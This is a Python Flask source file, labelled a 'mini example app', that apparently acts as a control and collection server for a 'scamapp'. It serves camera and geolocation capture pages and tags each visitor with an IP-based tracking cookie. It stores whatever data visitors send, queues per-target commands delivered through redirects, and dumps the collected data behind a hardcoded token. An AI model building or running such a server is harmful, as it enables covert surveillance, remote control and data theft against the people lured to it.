# Mini Flask example app.
from flask import Flask, render_template, request, make_response, abort, redirect, g
import os
import datetime
import random
from functools import wraps
import secrets

app = Flask(__name__)
BASE_URL = "resp://scamapp/?data="
app.config['COMMAND'] = {}
app.config['GLOBAL'] = None
app.config['CACHE'] = {}

def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = request.args.get('token')

        if not token or token != 'super_haslo':
            return abort(403)

        return f(*args, **kwargs)

    return decorated

def secrets_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        secret = request.cookies.get('special_id', None)
        if secret not in app.config['CACHE'] or app.config['GLOBAL'] is None and secret is not None:
            app.config['GLOBAL'] = secret
            

        return f(*args, **kwargs)

    return decorated


def generate_special_id():
    # Get user's IP address
    ip_address = request.remote_addr
    # Get user agent (web browser)
    user_agent = request.headers.get('User-Agent')
    # Combine IP address and user agent to generate special ID
    special_id = str(ip_address) + '_' + secrets.token_hex(16)

    return special_id

CACHE = {}

@app.route("/")
def root():
    return app.send_static_file('photo.jpg')

@app.route('/camera', methods=['GET'])
def get_camera():
    return render_template('camera.html')

@app.route('/geo', methods=['GET'])
def get_geolocation():
    return render_template('location.html')

@app.route('/service-worker.js')
def sw():
    return app.send_static_file('service-worker.js')

@app.route('/send')
@secrets_required
def send():
    url = BASE_URL
    if app.config['GLOBAL'] in app.config['COMMAND']:
        url = BASE_URL + app.config['COMMAND'][app.config['GLOBAL']]
    
    response = make_response(render_template('sender.html', data=url))
    return response

@app.route('/send2')
def send2():
    return make_response(redirect(BASE_URL))


@app.route('/pass')
def set_cookie_and_redirect():
    url = BASE_URL
    cookies = request.cookies

    if 'special_id' in cookies:
        if cookies.get('special_id') in app.config['COMMAND']:
            url = BASE_URL + app.config['COMMAND'][cookies.get('special_id')]
            app.config['COMMAND'][cookies.get('special_id')] = ''

    import logging
    logging.warning(url)

    response = make_response(redirect(url))
    # Create a response object
    param_value = request.args.get('data', None)
    data = []
    # Do something with the parameter value
    if param_value:
        data.append(param_value)
    


    if 'special_id' not in cookies:
    # Generate a special ID or retrieve it from some source
        special_id = generate_special_id()
        response.set_cookie('special_id', special_id)
        
        if special_id not in app.config['CACHE']:
            app.config['CACHE'][special_id] = data

    elif cookies.get('special_id') not in app.config['CACHE']:
        app.config['CACHE'][cookies.get('special_id')] = data
    
    else:
        app.config['CACHE'][cookies.get('special_id')].extend(data)

    return response


def redirect_url(command: str):
    url = BASE_URL + command
    return url


@app.route('/set_command/<string:target>/<string:command>')
def set_command(target, command):
    app.config['COMMAND'] = {target : command}
    return app.config['COMMAND']

@app.route('/command')
def command():
    return app.config['COMMAND']




@app.route('/cache')
@token_required
def cache():
   return app.config['CACHE']

@app.route('/refresh_cache')
def refresh_cache():
   CACHE = {}
   return {}, 200




if __name__ == "__main__":
    if os.environ.get('FLASK_DEBUG'):
        app.run(host='0.0.0.0', debug=True, port=5000)
    else:
        app.run()
